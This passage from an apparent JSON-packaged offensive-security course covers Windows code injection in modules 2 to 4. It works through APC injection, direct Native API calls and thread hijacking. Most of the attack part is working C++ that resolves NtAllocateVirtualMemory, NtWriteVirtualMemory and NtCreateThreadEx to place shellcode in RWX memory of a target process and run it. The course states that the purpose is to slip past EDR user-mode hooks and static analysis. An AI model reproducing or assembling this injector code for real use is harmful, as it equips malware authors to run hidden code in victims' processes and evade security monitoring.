mechanism.\r\n\r\n### Review and Next Steps\r\n\r\nIn this module, we dissected the Asynchronous Procedure Call mechanism, understood its dependency on the alertable state, and built a functional tool to inject and execute code using `QueueUserAPC`. We also discussed the primary detection vectors like API monitoring and memory scanning.\r\n\r\nWhile APC injection is more nuanced than `CreateRemoteThread`, it still relies on standard WinAPI calls (`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `QueueUserAPC`). As we learned in Module 1, relying solely on these can increase our static and dynamic footprint.\r\n\r\nIn **Module 3**, we will take a significant leap towards stealth by moving *below* the standard WinAPI layer and exploring the Native API (`ntdll.dll`) and potentially undocumented functions. This will allow us to perform operations like memory allocation and thread creation using functions that are less commonly hooked by security software, drawing inspiration from the low-level interaction concepts highlighted in resources like `zhasslan.txt`.\r\n\r\nGet your labs ready, experiment with your APC injector, try targeting different processes (and observe when the shellcode *doesn't* run if the thread isn't alertable!), and start thinking about how bypassing standard APIs could make your life harder as a defender trying to spot these actions.\r\n\r\nSee you in Module 3 for the Native API deep dive!"
    },
    {
      "title": "module_3",
      "description": "module_3 Overview",
      "order": 3,
      "content": "Okay team, let's buckle up and dive into Module 3. We've seen how standard WinAPI calls work and their limitations in terms of stealth. Now, we're going to peel back another layer of the Windows onion and look at the Native API. This is where things get closer to the metal, offering more power and, potentially, more evasion opportunities.\r\n\r\nRemember that feeling in Module 2 when you realized `CreateRemoteThread` and `WriteProcessMemory` might be noisy? Good. That's the motivation for this module. We're moving *down* the stack.\r\n\r\n---\r\n\r\n## Module 3: Deeper Access - Leveraging Native API and Undocumented Functions\r\n\r\n**Module Objective:** Understand the structure and purpose of the Native API (`ntdll.dll`) and learn techniques for finding and calling both documented and undocumented Native API functions for more stealthy operations.\r\n\r\n**Why is this crucial?** Think like a defender. They set up hooks on common WinAPI functions (`CreateProcess`, `WriteProcessMemory`, `CreateRemoteThread`, `VirtualAllocEx`, etc.). If your malicious code *only* calls these functions, it's relatively easy to spot. By going to the Native API, you're accessing the system at a lower level, potentially bypassing some user-mode hooks and making your activity look less like standard application behavior and more like, well, system-level operations. This can make detection harder.\r\n\r\n### 3.1 The Relationship: WinAPI vs. Native API\r\n\r\nImagine Windows as a complex machine.\r\n*   **WinAPI (`kernel32.dll`, `user32.dll`, `advapi32.dll`, etc.)** is like the polished dashboard and controls for the driver. It provides a stable, well-documented interface with high-level functions (`CreateFile`, `RegOpenKeyEx`, `MessageBox`). It's designed for application developers. These libraries reside in user-mode.\r\n*   **Native API (`ntdll.dll`)** is like the engine control unit and direct hydraulic lines. It provides a lower-level interface to the Windows Executive and Kernel. Functions here often start with `Nt` or `Zw` (we'll explain the difference shortly). `ntdll.dll` is also in user-mode, but its functions act as direct gateways into the kernel via system calls.\r\n\r\n**Key point:** Many WinAPI functions are essentially wrappers around Native API calls. For example, when you call `CreateFileA` from `kernel32.dll`, `CreateFileA` performs some argument validation and preparation *in user-mode*, and then makes a system call (via a function in `ntdll.dll` like `NtCreateFile`) to request the kernel to actually perform the file creation operation.\r\n\r\n**Visualizing the Stack:**\r\n\r\n```\r\nYour Application Code\r\n      |\r\n      v\r\nWinAPI (e.g., kernel32.dll)\r\n      | (Often makes internal calls to ntdll)\r\n      v\r\nNative API (ntdll.dll)\r\n      | (System Call / Syscall)\r\n      v\r\nWindows Executive / Kernel (ntoskrnl.exe)\r\n```\r\n\r\n### 3.2 Why Bypass WinAPI and Call Native API Directly?\r\n\r\nOkay, so if WinAPI just calls Native API anyway, why bother calling Native API directly?\r\n\r\n1.  **Stealth (Avoiding User-Mode Hooks):** Security software (like EDRs) often places user-mode hooks on common WinAPI functions in processes they monitor. When your code calls `WriteProcessMemory`, the EDR's hook gets triggered, logs the activity, and potentially blocks it. If you call `NtWriteVirtualMemory` directly, you bypass the hook placed on `WriteProcessMemory`. The call still goes through `ntdll.dll` and a system call, but the initial user-mode API wrapper hook is avoided.\r\n2.  **Access to Lower-Level Functionality:** The Native API exposes features and parameters that aren't always available or as granularly controlled through the WinAPI wrappers. `NtCreateThreadEx`, for instance, offers more control over thread creation attributes than the standard `CreateRemoteThread`.\r\n3.  **Reducing Import Footprint (for later):** While not fully realized until Module 6 (Dynamic Resolution), calling Native API directly means your compiled executable *might* not need to statically import functions like `VirtualAllocEx` or `WriteProcessMemory` from `kernel32.dll`. Instead, it might only need `LoadLibrary` and `GetProcAddress` (or their Native equivalents, or manual resolution) to find and call `ntdll.dll` functions. An executable with fewer or less common static imports looks less suspicious to simple static analysis tools.\r\n\r\n### 3.3 Methods for Calling Native API Functions\r\n\r\nSince you won't typically link directly against `ntdll.lib` (it's not a standard import library for applications), you need to resolve the addresses of the functions you want to call at runtime.\r\n\r\n**Method 1 (The Stepping Stone - Using `GetProcAddress`):**\r\n\r\nThis is the simplest way to start, although it still relies on the standard `LoadLibrary` and `GetProcAddress` WinAPI calls (which you'll later want to replace with dynamic resolution from Module 6).\r\n\r\nThe process:\r\n1.  Load the `ntdll.dll` module into your process's address space (if it's not already there, which it almost always is).\r\n2.  Get the address of the specific Native API function you want from `ntdll.dll` using `GetProcAddress`.\r\n3.  Define a function pointer with the correct signature (return type, calling convention, parameters) for the Native API function.\r\n4.  Cast the address obtained from `GetProcAddress` to this function pointer type.\r\n5.  Call the function through the pointer.\r\n\r\n**Important:** Native API functions typically use the `NTAPI` calling convention (which is `__stdcall`) and return an `NTSTATUS` value. `NTSTATUS` is a 32-bit value indicating success or failure, often checked using macros like `NT_SUCCESS()`.\r\n\r\nLet's see a basic example using `GetProcAddress` to get the address of `NtAllocateVirtualMemory`.\r\n\r\n```cpp\r\n#include <Windows.h>\r\n#include <winternl.h> // For NTSTATUS and other types\r\n\r\n// We need to define the function pointer type for the Native API function\r\n// The signature must match exactly!\r\n// NTSTATUS NtAllocateVirtualMemory(\r\n//   HANDLE    ProcessHandle,\r\n//   PVOID*    BaseAddress,\r\n//   ULONG_PTR ZeroBits,\r\n//   PSIZE_T   RegionSize,\r\n//   ULONG     AllocationType,\r\n//   ULONG     Protect\r\n// );\r\ntypedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(\r\n    HANDLE    ProcessHandle,\r\n    PVOID*    BaseAddress,\r\n    ULONG_PTR ZeroBits,\r\n    PSIZE_T   RegionSize,\r\n    ULONG     AllocationType,\r\n    ULONG     Protect\r\n);\r\n\r\nint main() {\r\n    // 1. Load ntdll.dll (usually already loaded)\r\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\r\n    if (hNtdll == NULL) {\r\n        // Handle error\r\n        return 1;\r\n    }\r\n\r\n    // 2. Get the address of the function using GetProcAddress\r\n    PNtAllocateVirtualMemory pNtAllocateVirtualMemory =\r\n        (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, \"NtAllocateVirtualMemory\");\r\n\r\n    if (pNtAllocateVirtualMemory == NULL) {\r\n        // Handle error\r\n        return 1;\r\n    }\r\n\r\n    printf(\"Successfully resolved NtAllocateVirtualMemory at: %p\\n\", pNtAllocateVirtualMemory);\r\n\r\n    // --- Example usage (conceptual - requires a valid process handle) ---\r\n    HANDLE hProcess = GetCurrentProcess(); // Or OpenProcess(target_pid, ...)\r\n    PVOID baseAddress = NULL;\r\n    SIZE_T regionSize = 0x1000; // 4 KB\r\n    NTSTATUS status = pNtAllocateVirtualMemory(\r\n        hProcess,\r\n        &baseAddress,\r\n        0, // ZeroBits\r\n        &regionSize,\r\n        MEM_COMMIT | MEM_RESERVE,\r\n        PAGE_EXECUTE_READWRITE\r\n    );\r\n\r\n    if (NT_SUCCESS(status)) {\r\n        printf(\"Successfully allocated memory via NtAllocateVirtualMemory at: %p\\n\", baseAddress);\r\n        // Now you would typically use NtWriteVirtualMemory and NtCreateThreadEx/NtQueueApcThread\r\n        // ...\r\n        // Don't forget to free the memory if needed (NtFreeVirtualMemory)\r\n        // status = NtFreeVirtualMemory(hProcess, &baseAddress, &regionSize, MEM_RELEASE);\r\n        // if (NT_SUCCESS(status)) { ... }\r\n    } else {\r\n        printf(\"Failed to allocate memory via NtAllocateVirtualMemory. Status: 0x%lX\\n\", status);\r\n    }\r\n\r\n    // In a real injector, you'd close the process handle\r\n    // CloseHandle(hProcess);\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\n**Method 2 (Manual Function Pointer/Casting):**\r\n\r\nThis is less a *different way to get the address* at this stage (we're still using `GetProcAddress` for simplicity), but rather a demonstration of how you'll *call* the function once you have its address, regardless of how you obtained it. It reinforces the idea of working with function pointers and casting. This becomes *essential* when you implement dynamic resolution by parsing the PE export table yourself in Module 6, as you won't be using `GetProcAddress` anymore.\r\n\r\nThe structure is the same as above, focusing on the typedef and the cast:\r\n\r\n```cpp\r\n// Define the function pointer type\r\ntypedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(\r\n    HANDLE    ProcessHandle,\r\n    PVOID*    BaseAddress,\r\n    ULONG_PTR ZeroBits,\r\n    PSIZE_T   RegionSize,\r\n    ULONG     AllocationType,\r\n    ULONG     Protect\r\n);\r\n\r\n// Get the address (using GetProcAddress for now, will be manual later)\r\nFARPROC pFuncAddress = GetProcAddress(hNtdll, \"NtAllocateVirtualMemory\");\r\n\r\n// Cast the address to the function pointer type\r\nPNtAllocateVirtualMemory pNtAllocateVirtualMemory = (PNtAllocateVirtualMemory)pFuncAddress;\r\n\r\n// Call the function through the pointer\r\nNTSTATUS status = pNtAllocateVirtualMemory(...);\r\n```\r\n\r\nThis pattern ‚Äì define typedef, get address, cast, call ‚Äì is fundamental to working with Native API and will be used extensively.\r\n\r\n### 3.4 Exploring `ntdll.dll`: Key Function Prefixes (`Nt`, `Zw`)\r\n\r\n`ntdll.dll` exports hundreds of functions. The most common prefixes you'll see are `Nt` and `Zw`.\r\n\r\n*   **`Nt*`:** These are the user-mode entry points to the majority of system services implemented in the Windows Executive (`ntoskrnl.exe`). When your user-mode code calls an `Nt*` function, it typically prepares the arguments and then executes a special instruction (like `syscall` on x64 or `sysenter`/`int 2E` on x86) to transition into kernel mode and execute the corresponding system service routine within `ntoskrnl.exe`.\r\n*   **`Zw*`:** These functions represent the *kernel-mode* entry points to the same system services. If kernel-mode code (like a driver) wants to call a system service, it uses the `Zw*` variant. For *user-mode* code, calling a `Zw*` function is generally equivalent to calling the corresponding `Nt*` function. The `ntdll.dll` stubs for `Zw*` functions simply jump to their `Nt*` counterparts. In offensive security, you'll primarily interact with the `Nt*` functions from user-mode.\r\n\r\n**How to explore `ntdll.dll` exports:**\r\n\r\n1.  **Using `dumpbin`:** A command-line tool included with Visual Studio.\r\n    ```bash\r\n    dumpbin /exports C:\\Windows\\System32\\ntdll.dll\r\n    ```\r\n    This will dump a list of all exported functions, including their ordinals and addresses (relative to the module base).\r\n2.  **Using Sysinternals Process Explorer:** View the properties of a running process. Go to the \"Modules\" tab, find `ntdll.dll`, double-click it, and go to the \"Exports\" tab. This provides a searchable list.\r\n3.  **Using PE Analyzers:** Tools like PE-Bear or CFF Explorer allow you to open `ntdll.dll` and browse its Export Directory Table visually.\r\n4.  **Using Disassemblers/Debuggers:** Load `ntdll.dll` into IDA Pro, Ghidra, or x64dbg. You can view the export list directly. You can also step into WinAPI calls to see which `ntdll.dll` function they call (e.g., set a breakpoint on `WriteProcessMemory` and step through it).\r\n\r\n### 3.5 Finding Undocumented Functions\r\n\r\nAlright, this is where it gets interesting and ties into the spirit of exploring like folks did in the days of `zhasslan.txt`. Not every useful function in `ntdll.dll` is fully documented on Microsoft Learn (MSDN). Some are internal helpers, some are remnants of older features, and some provide low-level access that isn't part of the public WinAPI contract.\r\n\r\n**What does \"undocumented\" mean here?** It means Microsoft doesn't provide official documentation, guarantees about its stability across OS versions, or support for applications using it.\r\n\r\n**How to find them (and what `zhasslan.txt` represents):**\r\n\r\n`zhasslan.txt` (and similar historical documents or modern research) embodies the methodology of deep Windows internal analysis. The goal wasn't just to use existing tools, but to understand the *mechanisms* by which Windows works at a low level.\r\n\r\nMethods employed (past and present):\r\n\r\n1.  **Analyzing `ntdll.dll` Exports:** Look for functions that don't have obvious WinAPI wrappers, have cryptic names, or appear related to core OS structures. Sometimes patterns emerge.\r\n2.  **Tracing WinAPI Calls:** Use a debugger or API monitor (like Process Monitor) to see the sequence of calls made by documented WinAPI functions. You'll often see them calling `Nt*` functions. This reveals the underlying Native API used for common operations.\r\n3.  **Reverse Engineering `ntoskrnl.exe`:** The actual kernel code. By analyzing how `ntoskrnl.exe` handles system calls (the `Nt*` functions), researchers can understand internal data structures and discover functions within the kernel that might be useful if called via a Native API entry point in `ntdll.dll`.\r\n4.  **Analyzing Data Structures:** Windows uses complex data structures (like the Executive Process Block - `EPROCESS`, Executive Thread Block - `ETHREAD`, Loader Data Table Entry - `LDR_DATA_TABLE_ENTRY`). Many undocumented `Nt*` functions operate on these structures. Understanding the structures themselves (often found by analyzing kernel code or crash dumps) helps interpret the purpose of functions that take pointers to them.\r\n5.  **Reviewing Public Security Research:** Many offensive and defensive researchers publish findings on undocumented APIs they've discovered or used.\r\n6.  **Fuzzing/Experimentation:** Sometimes, the purpose of a function can be inferred by calling it with different parameters in a controlled environment and observing the results or side effects.\r\n\r\n**The `zhasslan.txt` connection:** This specific document was influential because it detailed low-level Windows structures and APIs, including how to traverse things like the loaded module list (`LDR_DATA_TABLE_ENTRY`) directly from the Process Environment Block (PEB), bypassing standard WinAPI functions like `EnumProcessModules`. This kind of direct PEB/TEB access and manual structure traversal is a hallmark of advanced, stealthy techniques and is something we'll touch upon in Module 6 regarding finding module base addresses without standard APIs.\r\n\r\n**Crucial Caveat:** Using undocumented functions is risky. They can change or be removed in future Windows versions, potentially breaking your code. They are also more likely to be monitored by advanced security solutions because they are not part of typical application behavior.\r\n\r\n### 3.6 Practical Examples: Replacing WinAPI with Native API\r\n\r\nLet's look at the Native API counterparts for the core injection operations we discussed in Module 2.\r\n\r\n**1. Allocating Memory:**\r\n\r\n*   **WinAPI:** `VirtualAllocEx`\r\n*   **Native API:** `NtAllocateVirtualMemory`\r\n\r\nAs seen in the example above, `NtAllocateVirtualMemory` has a similar purpose but slightly different parameters and return type (`NTSTATUS`).\r\n\r\n```cpp\r\n// Function pointer typedef (as defined earlier)\r\ntypedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(\r\n    HANDLE    ProcessHandle,\r\n    PVOID*    BaseAddress,\r\n    ULONG_PTR ZeroBits,\r\n    PSIZE_T   RegionSize,\r\n    ULONG     AllocationType,\r\n    ULONG     Protect\r\n);\r\n\r\n// ... in your code ...\r\nPNtAllocateVirtualMemory pNtAllocateVirtualMemory = // ... resolved address ...\r\n\r\nHANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, target_pid);\r\nif (hProcess == NULL) { /* error */ }\r\n\r\nPVOID remoteBuffer = NULL; // Will hold the allocated address\r\nSIZE_T bufferSize = shellcode_size; // Size of your shellcode\r\n\r\n// Call the Native API function\r\nNTSTATUS status = pNtAllocateVirtualMemory(\r\n    hProcess,\r\n    &remoteBuffer, // Address of the pointer to receive the allocated address\r\n    0,             // ZeroBits - usually 0\r\n    &bufferSize,   // Pointer to the size, can be adjusted by the kernel\r\n    MEM_COMMIT | MEM_RESERVE, // Allocation type flags\r\n    PAGE_EXECUTE_READWRITE // Protection flags\r\n);\r\n\r\nif (!NT_SUCCESS(status)) {\r\n    printf(\"[-] Failed to allocate memory via NtAllocateVirtualMemory. Status: 0x%lX\\n\", status);\r\n    CloseHandle(hProcess);\r\n    return 1;\r\n}\r\n\r\nprintf(\"[+] Allocated %zu bytes at %p via NtAllocateVirtualMemory.\\n\", bufferSize, remoteBuffer);\r\n\r\n// remoteBuffer now holds the address in the target process\r\n```\r\n\r\n**2. Writing Memory:**\r\n\r\n*   **WinAPI:** `WriteProcessMemory`\r\n*   **Native API:** `NtWriteVirtualMemory`\r\n\r\nAgain, similar purpose, different signature and return type.\r\n\r\n```cpp\r\n#include <winternl.h> // For NTSTATUS\r\n\r\n// Function pointer typedef\r\n// NTSTATUS NtWriteVirtualMemory(\r\n//   HANDLE    ProcessHandle,\r\n//   PVOID     BaseAddress,\r\n//   PVOID     Buffer,\r\n//   ULONG     BufferLength,\r\n//   PULONG    BytesWritten\r\n// );\r\ntypedef NTSTATUS (NTAPI *PNtWriteVirtualMemory)(\r\n    HANDLE    ProcessHandle,\r\n    PVOID     BaseAddress,\r\n    PVOID     Buffer,\r\n    ULONG     BufferLength,\r\n    PULONG    BytesWritten\r\n);\r\n\r\n// ... in your code after allocating memory ...\r\nPNtWriteVirtualMemory pNtWriteVirtualMemory = // ... resolved address ...\r\n\r\n// Assuming 'hProcess' and 'remoteBuffer' from the allocation step\r\n// Assuming 'shellcode' is a byte array and 'shellcode_size' is its size\r\n\r\nULONG bytesWritten = 0;\r\nstatus = pNtWriteVirtualMemory(\r\n    hProcess,\r\n    remoteBuffer,     // Base address in target process\r\n    (PVOID)shellcode, // Local buffer containing data to write\r\n    shellcode_size,   // Number of bytes to write\r\n    &bytesWritten     // Optional: Pointer to receive number of bytes written\r\n);\r\n\r\nif (!NT_SUCCESS(status)) {\r\n     printf(\"[-] Failed to write memory via NtWriteVirtualMemory. Status: 0x%lX\\n\", status);\r\n     // Clean up allocated memory if necessary\r\n     // SIZE_T freeSize = 0; // For MEM_RELEASE, size is ignored but needs to be 0\r\n     // NtFreeVirtualMemory(hProcess, &remoteBuffer, &freeSize, MEM_RELEASE);\r\n     CloseHandle(hProcess);\r\n     return 1;\r\n}\r\n\r\nprintf(\"[+] Wrote %lu bytes to %p via NtWriteVirtualMemory.\\n\", bytesWritten, remoteBuffer);\r\n```\r\n\r\n**3. Creating/Executing Code (Thread Creation):**\r\n\r\n*   **WinAPI:** `CreateRemoteThread`, `CreateRemoteThreadEx`\r\n*   **Native API:** `NtCreateThreadEx`\r\n\r\n`NtCreateThreadEx` is a more powerful, less documented (in terms of public usage examples) Native API function for creating threads. It allows finer control over thread attributes and creation flags. This is a common choice in advanced injection because it's not the standard `CreateRemoteThread` and offers more flexibility.\r\n\r\n```cpp\r\n#include <winternl.h> // For NTSTATUS\r\n// You might need to define the THREAD_ATTRIBUTES structure if it's not in your headers\r\n// It can vary slightly by OS version/architecture, but typically looks something like this:\r\n/*\r\ntypedef struct _OBJECT_ATTRIBUTES {\r\n    ULONG Length;\r\n    HANDLE RootDirectory;\r\n    PUNICODE_STRING ObjectName;\r\n    ULONG Attributes;\r\n    PVOID SecurityDescriptor;\r\n    PVOID SecurityQualityOfService;\r\n} OBJECT_ATTRIBUTES;\r\ntypedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;\r\n\r\ntypedef struct _PS_ATTRIBUTE {\r\n    ULONG Attribute;\r\n    SIZE_T Size;\r\n    union {\r\n        ULONG Value;\r\n        PVOID ValuePtr;\r\n    } u1;\r\n    PSIZE_T ReturnLength;\r\n} PS_ATTRIBUTE, *PPS_ATTRIBUTE;\r\n\r\ntypedef struct _PS_ATTRIBUTE_LIST {\r\n    SIZE_T TotalLength;\r\n    PS_ATTRIBUTE Attributes[1];\r\n} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;\r\n\r\n// Define attribute numbers (these are often found via RE or unofficial docs)\r\n// #define PS_ATTRIBUTE_CLIENT_ID 1 // Example\r\n// #define PS_ATTRIBUTE_EXCEPTION_PORT 2 // Example\r\n// ... and so on ...\r\n*/\r\n// For simplicity in this example, we'll rely on winternl.h if available or assume basic attributes.\r\n// A full implementation might need manual structure definition and attribute number lookup.\r\n\r\n\r\n// Function pointer typedef\r\n// NTSTATUS NtCreateThreadEx(\r\n//   OUT PHANDLE hThread,\r\n//   IN ACCESS_MASK DesiredAccess,\r\n//   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n//   IN HANDLE ProcessHandle,\r\n//   IN PVOID lpStartAddress,\r\n//   IN PVOID lpParameter,\r\n//   IN ULONG Flags, // e.g., CREATE_SUSPENDED\r\n//   IN SIZE_T ZeroBits,\r\n//   IN SIZE_T StackSize,\r\n//   IN SIZE_T MaximumStackSize,\r\n//   IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL\r\n// );\r\ntypedef NTSTATUS (NTAPI *PNtCreateThreadEx)(\r\n    OUT PHANDLE hThread,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN HANDLE ProcessHandle,\r\n    IN PVOID lpStartAddress,\r\n    IN PVOID lpParameter,\r\n    IN ULONG Flags, // e.g. THREAD_CREATE_FLAGS_CREATE_SUSPENDED (defined in winternl.h)\r\n    IN SIZE_T ZeroBits,\r\n    IN SIZE_T StackSize,\r\n    IN SIZE_T MaximumStackSize,\r\n    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL\r\n);\r\n\r\n\r\n// ... in your code after writing shellcode ...\r\nPNtCreateThreadEx pNtCreateThreadEx = // ... resolved address ...\r\n\r\n// Assuming 'hProcess' and 'remoteBuffer' (shellcode address) from previous steps\r\n\r\nHANDLE hRemoteThread = NULL;\r\n// We can use an empty OBJECT_ATTRIBUTES for simplicity if not needing specific security/naming\r\nOBJECT_ATTRIBUTES objAttributes;\r\nInitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);\r\n\r\n// We can use NULL for AttributeList for a basic thread\r\n// For more advanced control (e.g., hiding the thread), you'd use a PS_ATTRIBUTE_LIST\r\n\r\nstatus = pNtCreateThreadEx(\r\n    &hRemoteThread,         // OUT: Handle to the new thread\r\n    THREAD_ALL_ACCESS,      // Desired access\r\n    &objAttributes,         // Object attributes (can be NULL)\r\n    hProcess,               // Process handle\r\n    remoteBuffer,           // Start address (our shellcode)\r\n    NULL,                   // Parameter to pass to the start address (shellcode)\r\n    0,                      // Flags (e.g., THREAD_CREATE_FLAGS_CREATE_SUSPENDED)\r\n    0,                      // ZeroBits (usually 0)\r\n    0,                      // StackSize (0 uses default)\r\n    0,                      // MaximumStackSize (0 uses default)\r\n    NULL                    // AttributeList (can be NULL for basic thread)\r\n);\r\n\r\nif (!NT_SUCCESS(status)) {\r\n    printf(\"[-] Failed to create thread via NtCreateThreadEx. Status: 0x%lX\\n\", status);\r\n    // Clean up allocated memory\r\n    // SIZE_T freeSize = 0;\r\n    // NtFreeVirtualMemory(hProcess, &remoteBuffer, &freeSize, MEM_RELEASE);\r\n    CloseHandle(hProcess);\r\n    return 1;\r\n}\r\n\r\nprintf(\"[+] Created remote thread via NtCreateThreadEx with handle 0x%p.\\n\", hRemoteThread);\r\n\r\n// Wait for the thread to finish if necessary\r\n// WaitForSingleObject(hRemoteThread, INFINITE);\r\n\r\n// Clean up handles\r\nCloseHandle(hRemoteThread);\r\nCloseHandle(hProcess);\r\n```\r\n\r\n**Instructor Notes:**\r\n\r\n*   Defining the Native API function signatures exactly is critical. Tools like PInvoke.net (for C# but useful for signatures), unofficial headers (like `wintern"
    },
    {
      "title": "module_4",
      "description": "module_4 Overview",
      "order": 4,
      "content": "Alright team, buckle up! We've navigated the foundational internals (Module 1), played with the asynchronous power of APCs (Module 2), and dipped our toes into the raw, low-level world of the Native API (Module 3). Now, we're going even deeper into the rabbit hole of execution control.\r\n\r\nThis module, Module 4, is all about exploring *alternative* ways to make code run in a target process that aren't your standard `CreateRemoteThread` or `QueueUserAPC`. We'll look at **Fibers**, a form of user-mode cooperative multitasking that can be repurposed, and more critically, **Manual Thread Context Manipulation**, which is essentially pausing a thread and telling the CPU, \"Hey, forget what you were doing, jump *here* instead!\" This is powerful stuff, often seen in advanced packers and shellcode loaders, directly referencing the kind of low-level control hinted at in sources like `zhasslan.txt`.\r\n\r\nWe're moving beyond just *providing* code to a thread; we're looking at *hijacking* the thread's very execution state. This requires a solid grasp of CPU architecture basics (registers, instruction pointer, stack) and how Windows manages thread context. Don't worry if assembly is still a bit fuzzy ‚Äì we'll focus on the concepts and how to apply them using higher-level languages and APIs, but understanding the low-level result is key.\r\n\r\nLet's dive in!\r\n\r\n---\r\n\r\n## Module 4: Alternative Execution - Fibers and Manual Context Manipulation\r\n\r\n**Module Objective:** By the end of this module, you will understand the concepts of Windows Fibers and Thread Context. You will be able to implement basic local Fiber creation and switching, and understand the process and challenges involved in using manual thread context manipulation (`GetThreadContext`/`SetThreadContext`) to redirect execution flow within a target process.\r\n\r\n**Prerequisites:**\r\n\r\n*   Solid understanding of Processes, Threads, and Memory Allocation (Module 1).\r\n*   Familiarity with Native API concepts and usage (Module 3).\r\n*   Basic understanding of CPU registers, instruction pointers (EIP/RIP), and stack pointers (ESP/RSP) is highly recommended. Some exposure to assembly language concepts will be beneficial.\r\n\r\n---\r\n\r\n### Section 4.1: Fibers vs. Threads - Understanding the Difference\r\n\r\nAlright, let's start with Fibers. You've been working with threads. Threads are the fundamental units of execution scheduled by the Windows kernel. The kernel decides when a thread runs, for how long, and handles the context switching between threads. This is *preemptive multitasking*. The kernel *preempts* a thread's execution to let another one run.\r\n\r\nFibers are different. Think of them as **user-mode threads** or **coroutines**. They run *within* a single thread. The key difference? **Fibers are cooperatively scheduled.** This means a Fiber only gives up control when it explicitly calls a function like `SwitchToFiber`. The kernel doesn't know or care about individual Fibers; it only sees the *thread* they are running inside.\r\n\r\nWhy do they exist? Historically, they were sometimes used for porting code from systems that used cooperative multitasking. They can also be useful for specific application architectures where you want fine-grained control over scheduling logical tasks within a single thread, perhaps to avoid the overhead of kernel-mode context switches or simplify synchronization within that thread.\r\n\r\n**Key Differences Summarized:**\r\n\r\n| Feature            | Threads                                  | Fibers                                         |\r\n| :----------------- | :--------------------------------------- | :--------------------------------------------- |\r\n| **Scheduling**     | Preemptive (Kernel-managed)              | Cooperative (User-managed via `SwitchToFiber`) |\r\n| **Execution Unit** | Scheduled by the Kernel                  | Run *within* a single Thread                   |\r\n| **Context Switch** | Kernel-mode overhead                     | User-mode overhead (lighter)                   |\r\n| **Visibility**     | Visible to the Kernel and OS scheduling  | Only visible within the owning Thread          |\r\n| **Creation**       | `CreateThread`, `_beginthreadex`, etc.   | `CreateFiber`, `ConvertThreadToFiber`          |\r\n| **Management**     | Kernel APIs (`SuspendThread`, etc.)      | Fiber APIs (`SwitchToFiber`, `DeleteFiber`)    |\r\n\r\nSo, how might this be relevant for offensive operations? While creating *remote* Fibers for general injection is complex and often less practical than APCs or remote threads (you still need a target thread to run the Fiber, and getting it into a state to *switch* to your remote Fiber is tricky), understanding Fibers is important for:\r\n\r\n1.  **Completeness:** Knowing *all* execution contexts.\r\n2.  **Potential Edge Cases:** Maybe a specific application *uses* Fibers, and there's a way to hook into that mechanism.\r\n3.  **Conceptual Link:** The idea of manually switching contexts (`SwitchToFiber`) is conceptually related to manually manipulating a thread's context (`SetThreadContext`), which we'll cover next.\r\n\r\nLet's look at the core Fiber APIs and a simple local example.\r\n\r\n#### Core Fiber APIs\r\n\r\n*   `ConvertThreadToFiber(LPVOID lpParameter)`: Converts the *current* thread into a Fiber. A thread *must* be converted to a Fiber before it can create or switch to other Fibers. `lpParameter` is a data value associated with this initial Fiber. Returns a handle to the new Fiber.\r\n*   `CreateFiber(SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter)`: Creates a new Fiber. `dwStackSize` is the stack size (0 uses default). `lpStartAddress` is the function the Fiber starts executing when switched to. `lpParameter` is passed to the start routine. Returns a handle to the new Fiber.\r\n*   `SwitchToFiber(LPVOID lpFiber)`: Switches execution control from the current Fiber to the specified Fiber (`lpFiber`). The state of the current Fiber is saved.\r\n*   `DeleteFiber(LPVOID lpFiber)`: Deletes a Fiber. You must *not* delete the currently running Fiber.\r\n*   `GetCurrentFiber()`: Returns the address of the currently running Fiber.\r\n*   `GetCurrentFiberId()`: Returns the ID of the currently running Fiber (available since Windows 8).\r\n\r\n#### Simple Local Fiber Example\r\n\r\nThis example demonstrates creating a couple of Fibers within the main thread and switching between them.\r\n\r\n```cpp\r\n#include <windows.h>\r\n#include <stdio.h>\r\n\r\n// Function prototypes for our fiber routines\r\nVOID WINAPI FiberFunc1(LPVOID lpParameter);\r\nVOID WINAPI FiberFunc2(LPVOID lpParameter);\r\n\r\n// Fiber handles\r\nLPVOID g_mainFiber;\r\nLPVOID g_fiber1;\r\nLPVOID g_fiber2;\r\n\r\n// Parameter structure (optional, but good for passing data)\r\ntypedef struct {\r\n    int id;\r\n    const char* name;\r\n} FiberParam;\r\n\r\n// Function that Fiber 1 will execute\r\nVOID WINAPI FiberFunc1(LPVOID lpParameter) {\r\n    FiberParam* param = (FiberParam*)lpParameter;\r\n    printf(\"Fiber %d (%s): Started.\\n\", param->id, param->name);\r\n\r\n    // Loop a few times, switching to Fiber 2\r\n    for (int i = 0; i < 3; ++i) {\r\n        printf(\"Fiber %d (%s): Running iteration %d, switching to Fiber 2.\\n\", param->id, param->name, i + 1);\r\n        SwitchToFiber(g_fiber2); // Switch to Fiber 2\r\n        printf(\"Fiber %d (%s): Switched back from Fiber 2.\\n\", param->id, param->name);\r\n    }\r\n\r\n    printf(\"Fiber %d (%s): Finished its loop, switching back to Main Fiber.\\n\", param->id, param->name);\r\n    SwitchToFiber(g_mainFiber); // Switch back to the main fiber\r\n\r\n    // This part should ideally not be reached if SwitchToFiber is called\r\n    printf(\"Fiber %d (%s): Exiting (should not happen).\\n\", param->id, param->name);\r\n}\r\n\r\n// Function that Fiber 2 will execute\r\nVOID WINAPI FiberFunc2(LPVOID lpParameter) {\r\n    FiberParam* param = (FiberParam*)lpParameter;\r\n    printf(\"Fiber %d (%s): Started.\\n\", param->id, param->name);\r\n\r\n    // Loop a few times, switching back to Fiber 1\r\n    for (int i = 0; i < 2; ++i) { // Loop less times than Fiber 1\r\n        printf(\"Fiber %d (%s): Running iteration %d, switching to Fiber 1.\\n\", param->id, 